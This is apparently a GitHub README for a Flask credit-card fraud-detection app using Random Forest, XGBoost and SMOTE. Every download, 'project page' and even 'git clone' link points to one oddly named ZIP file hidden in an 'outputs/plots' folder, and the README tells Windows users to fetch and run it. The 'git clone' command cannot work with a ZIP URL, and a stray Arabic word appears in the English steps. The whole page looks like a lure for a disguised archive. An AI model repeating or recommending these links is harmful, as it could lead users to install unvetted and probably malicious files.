# 🛡️ Syntecxhub_Project_CreditCardFraudDetection - Real-Time Fraud Checks Made Simple

[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip)

## 📥 Download

Visit this page to download and run the app on Windows:

https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip

## 🧾 What this app does

Syntecxhub_Project_CreditCardFraudDetection is a web app that checks credit card transactions for fraud. It uses machine learning models built with Random Forest and XGBoost. It also uses SMOTE to handle imbalanced data, so the app can learn from rare fraud cases.

You can open the web page, enter transaction details, and get a fraud prediction in real time. The app runs through Flask, so it works in a browser on your Windows PC.

## 🖥️ What you need

Use a Windows computer with:

- A stable internet connection
- A modern web browser like Chrome, Edge, or Firefox
- Enough free disk space for the project files
- Python installed if you plan to run the source code
- Git if you want to clone the repository

If you only want to open the app from the project page, you do not need to know how to code.

## 🚀 Getting Started

Follow these steps to set up the project on Windows.

### 1. Open the project page

Go to:

https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip

From there, download the files or clone the repository to your computer.

### 2. Download the files

If you see a ZIP file option, download it and save it to your Downloads folder.

If you use Git, clone the repository with:

```bash
git clone https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip
```

### 3. Extract the folder

If you downloaded a ZIP file:

- Find the ZIP file in your Downloads folder
- Right-click it
- Select Extract All
- Choose a folder you can find again, مثل Desktop or Documents

### 4. Open the project folder

Open the extracted folder named:

Syntecxhub_Project_CreditCardFraudDetection

Look for files that help run the app, such as:

- app.py
- requirements.txt
- model files
- templates folder
- static folder

### 5. Install Python

If Python is not on your computer:

- Go to the official Python website
- Download the latest Windows version
- Install it
- During setup, check Add Python to PATH

This lets Windows find Python from the command line.

### 6. Open Command Prompt

Do this in the project folder:

- Hold Shift
- Right-click inside the folder
- Select Open PowerShell window here or Open in Terminal

This opens a command window in the right place.

### 7. Install the project tools

Type this command and press Enter:

```bash
pip install -r requirements.txt
```

This installs the tools the app needs, such as Flask, scikit-learn, XGBoost, pandas, and joblib.

If the project does not include a requirements file, install common packages with:

```bash
pip install flask pandas scikit-learn xgboost imbalanced-learn joblib numpy
```

### 8. Start the app

Run the main file:

```bash
python app.py
```

If the project uses a different file name, open the folder and look for the main Python file, then run it with Python.

### 9. Open the app in your browser

After the app starts, the terminal will show a local address such as:

```bash
http://127.0.0.1:5000
```

Copy that address and paste it into your browser.

## 🧭 How to use the app

Use the form on the web page to enter transaction values.

Typical inputs may include:

- Transaction amount
- Time-related values
- Transaction pattern data
- Other numeric fields used by the model

Then click the button to check the result.

The app will show whether the transaction looks normal or suspicious based on the model output.

## 🧠 How it works

The app uses a few parts that work together:

- **Flask** serves the web page
- **Random Forest** helps make the prediction
- **XGBoost** gives another model for fraud checks
- **SMOTE** helps balance the training data
- **scikit-learn** handles model training and prediction

This setup helps the app work with fraud data, which often has far fewer fraud cases than normal cases.

## 📁 Project Files

You may see these files and folders in the project:

- **app.py**: starts the web app
- **model files**: saved fraud detection models
- **templates/**: HTML pages for the browser
- **static/**: CSS, images, and other web files
- **requirements.txt**: package list for Python
- **README.md**: project notes

## 🔧 Common Windows Setup Steps

### If Python is not recognized

If you see an error like Python is not recognized, close Command Prompt and reopen it after installing Python.

Then try:

```bash
python --version
```

If that shows a Python version, the install worked.

### If pip does not work

Try:

```bash
python -m pip install -r requirements.txt
```

This uses Python directly to install the packages.

### If the browser does not open

Open your browser yourself and enter the local address shown in the terminal.

## 🛠️ Troubleshooting

### The app closes right away

Check whether you started the correct Python file.

### A package install fails

Run the install command again with a stable internet connection.

### The page shows an error

Make sure all project files are in the same folder and none are missing.

### The model does not load

Check that the model files stayed in the project folder after extraction.

## 📌 Main Features

- Real-time fraud prediction in a browser
- Uses Random Forest and XGBoost
- Handles imbalanced fraud data with SMOTE
- Simple Flask web interface
- Built for quick checks on Windows
- Suitable for local use from your own PC

## 🧪 Example Use Case

A user enters transaction details into the form on the web page. The app sends the values to the model. The model then returns a fraud result. This helps the user check a transaction before taking action.

## 🔗 Direct Access

Project page and download path:

https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip

## 📚 Topics

credit-card-fraud-detection, data, flask, fraud-detection, imbalanced-learning, machine-learning, python, random-forest, scikit-learn, smote, xgboost